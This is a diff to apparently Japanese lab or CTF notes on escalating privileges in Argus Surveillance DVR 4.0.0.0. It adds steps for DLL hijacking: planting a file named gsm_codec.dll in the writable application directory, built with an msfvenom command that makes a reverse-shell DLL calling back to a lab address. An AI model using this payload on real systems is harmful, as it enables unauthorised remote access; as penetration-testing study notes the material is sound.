@@ -3,8 +3,13 @@
 - [Argus Surveillance DVR 4.0.0.0 - Privilege Escalation](https://www.exploit-db.com/exploits/45312)
 
 - アプリケーションディレクトリは書き込み可能なので、これが怪しい
+- 以下DLLを作成し、APP ディレクトリに配置する
 ```sh
+gsm_codec.dll
+```
 
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f dll -o gsm_codec.dll
 ```
 
 # Argus surveilance dvr unquoted P.E -> Program Filesが書き込み不可なので失敗
